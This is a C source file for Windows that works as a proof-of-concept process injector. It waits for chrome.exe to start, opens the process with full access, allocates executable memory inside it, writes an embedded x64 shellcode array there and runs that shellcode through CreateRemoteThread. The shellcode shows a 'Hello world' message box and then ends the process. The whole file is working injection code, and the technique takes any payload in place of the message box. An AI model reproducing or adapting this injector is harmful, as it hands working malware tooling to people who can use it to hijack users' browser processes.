#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(int argc, char** argv) {
    // Define MessageBox shellcode (x64)
    unsigned char shellcode[] =
        "\x48\x83\xEC\x28"
        "\x48\x83\xE4\xF0"
        "\x48\x8D\x15\x66\x00\x00\x00"
        "\x48\x8D\x0D\x52\x00\x00\x00"
        "\xE8\x9E\x00\x00\x00"
        "\x4C\x8B\xF8"
        "\x48\x8D\x0D\x5D\x00\x00\x00"
        "\xFF\xD0"
        "\x48\x8D\x15\x5F\x00\x00\x00"
        "\x48\x8D\x0D\x4D\x00\x00\x00"
        "\xE8\x7F\x00\x00\x00"
        "\x4D\x33\xC9"
        "\x4C\x8D\x05\x61\x00\x00\x00"
        "\x48\x8D\x15\x4E\x00\x00\x00"
        "\x48\x33\xC9"
        "\xFF\xD0"
        "\x48\x8D\x15\x56\x00\x00\x00"
        "\x48\x8D\x0D\x0A\x00\x00\x00"
        "\xE8\x56\x00\x00\x00"
        "\x48\x33\xC9"
        "\xFF\xD0"
        "\x4B\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00"
        "\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00"
        "\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C\x00"
        "\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00"
        "\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
        "\x4D\x65\x73\x73\x61\x67\x65\x00"
        "\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00"
        "\x48\x83\xEC\x28"
        "\x65\x4C\x8B\x04\x25\x60\x00\x00\x00"
        "\x4D\x8B\x40\x18"
        "\x4D\x8D\x60\x10"
        "\x4D\x8B\x04\x24"
        "\xFC\x49\x8B\x78\x60"
        "\x48\x8B\xF1"
        "\xAC"
        "\x84\xC0"
        "\x74\x26"
        "\x8A\x27"
        "\x80\xFC\x61"
        "\x7C\x03"
        "\x80\xEC\x20"
        "\x3A\xE0"
        "\x75\x08"
        "\x48\xFF\xC7"
        "\x48\xFF\xC7"
        "\xEB\xE5"
        "\x4D\x8B\x00"
        "\x4D\x3B\xC4"
        "\x75\xD6"
        "\x48\x33\xC0"
        "\xE9\xA7\x00\x00\x00"
        "\x49\x8B\x58\x30"
        "\x44\x8B\x4B\x3C"
        "\x4C\x03\xCB"
        "\x49\x81\xC1\x88\x00\x00\x00"
        "\x45\x8B\x29"
        "\x4D\x85\xED"
        "\x75\x08"
        "\x48\x33\xC0"
        "\xE9\x85\x00\x00\x00"
        "\x4E\x8D\x04\x2B"
        "\x45\x8B\x71\x04"
        "\x4D\x03\xF5"
        "\x41\x8B\x48\x18"
        "\x45\x8B\x50\x20"
        "\x4C\x03\xD3"
        "\xFF\xC9"
        "\x4D\x8D\x0C\x8A"
        "\x41\x8B\x39"
        "\x48\x03\xFB"
        "\x48\x8B\xF2"
        "\xA6"
        "\x75\x08"
        "\x8A\x06"
        "\x84\xC0"
        "\x74\x09"
        "\xEB\xF5"
        "\xE2\xE6"
        "\x48\x33\xC0"
        "\xEB\x4E"
        "\x45\x8B\x48\x24"
        "\x4C\x03\xCB"
        "\x66\x41\x8B\x0C\x49"
        "\x45\x8B\x48\x1C"
        "\x4C\x03\xCB"
        "\x41\x8B\x04\x89"
        "\x49\x3B\xC5"
        "\x7C\x2F"
        "\x49\x3B\xC6"
        "\x73\x2A"
        "\x48\x8D\x34\x18"
        "\x48\x8D\x7C\x24\x30"
        "\x4C\x8B\xE7"
        "\xA4"
        "\x80\x3E\x2E"
        "\x75\xFA"
        "\xA4"
        "\xC7\x07\x44\x4C\x4C\x00"
        "\x49\x8B\xCC"
        "\x41\xFF\xD7"
        "\x49\x8B\xCC"
        "\x48\x8B\xD6"
        "\xE9\x14\xFF\xFF\xFF"
        "\x48\x03\xC3"
        "\x48\x83\xC4\x28"
        "\xC3";

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Flag to track if Chrome is found
        BOOL chromeFound = FALSE;


        int searchCount = 0;
        while (!chromeFound) {
            // Take a snapshot of all running processes
            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            // Get the first process info in the snapshot
            Process32First(snapshot, &pe32);



            // Loop through the whole snapshot until `chrome.exe` is found
            do {
                // Check if we have a match for `chrome.exe`
                if (wcsncmp(pe32.szExeFile, L"chrome.exe", wcslen(L"chrome.exe")) == 0) {
                    chromeFound = TRUE;

                    // Obtain a handle to `chrome.exe`
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess == NULL) {
                        printf("Failed to obtain handle to process: %ul\n", GetLastError());
                        break;
                    }

                    // Allocate memory in `chrome.exe`
                    LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                    if (allocated_mem == NULL) {
                        printf("Memory allocation failed: %ul\n", GetLastError());
                        CloseHandle(hProcess);
                        break;
                    }

                    printf("Memory page allocated at: 0x%p\n", allocated_mem);
                    // Write shellcode to the allocated memory in `chrome.exe`
                    WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), NULL);
                    // Create a thread to execute shellcode
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
                    if (hThread == NULL) {
                        printf("Failed to create remote thread: %ul\n", GetLastError());
                        VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                        CloseHandle(hProcess);
                        break;
                    }

                    // Halt execution until thread returns
                    WaitForSingleObject(hThread, INFINITE);
                    // Free allocated memory in `chrome.exe`
                    VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                    // Close the handle to the created thread
                    CloseHandle(hThread);
                    // Close the handle to `chrome.exe` process
                    CloseHandle(hProcess);

                    break;
                }
            } while (Process32Next(snapshot, &pe32));

            // Close the snapshot handle
            CloseHandle(snapshot);

            if (!chromeFound) {
                // Clear the console
                system("cls"); // Use "cls" for Windows or "clear" for Unix-based systems

                // Print "Searching..." with a dot animation
                printf("Searching");
                for (int i = 0; i <= searchCount; i++) {
                    printf(".");
                }
                printf("\n");

                // Increment the search count
                searchCount = (searchCount + 1) % 3; // Limit the dots to 4 for simplicity

                // Wait for a while before searching again to avoid excessive CPU usage
                Sleep(1000); // Wait for 1 second
            }
        }

        if (chromeFound) {
            printf("Chrome.exe found and code was injected Successfully!.\n");
        }
        else {
            printf("Chrome.exe not found.\n");
        }

        return 0;
}